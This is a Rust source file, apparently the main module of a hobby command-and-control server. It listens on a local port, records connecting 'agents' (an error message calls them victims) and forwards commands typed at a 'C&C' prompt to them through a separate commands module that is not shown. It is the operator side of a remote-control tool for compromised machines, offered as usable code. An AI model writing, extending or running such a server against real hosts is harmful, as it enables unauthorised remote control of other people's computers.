// Dependecies
use std::{io::{self, Write}, net::{Shutdown, TcpListener, TcpStream}};


// Internal modules
mod constants;
mod commands;
mod c2_state;

use constants::{RESET, DIM, BOLD, WHITE, GREEN, YELLOW, RED, CYAN };
use c2_state::C2State;


pub fn print_prompt(state: &C2State) {
    let count = state.agent_count(); 
    let module = state.current_mod();

    let agents_color = match count {
        0       => RED,
        1..=4   => YELLOW,
        _       => CYAN,
    };

    print!(
        "{BOLD}{RED}C&C{RESET} \
         {DIM}[{RESET}{agents_color}agents:{count}{RESET}{DIM}]{RESET} \
         {DIM}[{RESET}{WHITE}mod:{module}{RESET}{DIM}]{RESET} \
         {BOLD}{CYAN}❯{RESET} ",
    );

    io::stdout().flush().unwrap();
}

fn handle_instruct(instruct: &str, conn: &mut TcpStream) -> Result<bool, String> {
    commands::dispatch(instruct, conn)
}


fn handle_client(mut conn: TcpStream, state: &C2State) -> Result<(), String>{


    // let mut buff = [0; 1024];
    let mut instruct = String::new();

    
    loop {
        instruct.clear(); // Clear the buffer

        // Read from CLI
        print_prompt(state);
        
        io::stdout().flush().expect("Server failed to flush output");
        io::stdin()
            .read_line(&mut instruct)
            .map_err(|e| e.to_string())?;

        if instruct.trim().to_ascii_lowercase() == "q" || instruct.trim().to_ascii_lowercase() == "exit" {
            conn.write_all(b"q").map_err(|e| e.to_string())?;
            conn.shutdown(Shutdown::Both).map_err(|e| e.to_string())?;
            break;
        }
        
        match handle_instruct(instruct.trim(), &mut conn) {
            Ok(b) if b => "",
            Err(err) => { println!("An error has ocurred: {}", err); break; }
            _ => break
        };
    }
    
    Ok(())
}





fn main() {
    let state: C2State = C2State::new();

    let listener = TcpListener::bind("127.0.0.1:1337")
        .expect("the port can not be opened...");

    println!("Listing on port: 1337");

    for stream in listener.incoming(){
        match stream {
            Ok(stream) =>  {
                println!("Client connected: {:?}", stream.peer_addr());
                
                // Add address to agent state
                let Some(addr) = stream.peer_addr().ok() else {
                    eprintln!("{}[!]{} No se pudo obtener peer_addr", RED, RESET);
                    return;
                };
                state.add_agent(&addr.to_string());

                match handle_client(stream, &state) {
                    Ok(_) => (),
                    Err(err) => eprintln!("{}", err)
                }

            },
            Err(error) => {
                eprintln!("Error accepting victim: {}", error)
            }
        }
    }
}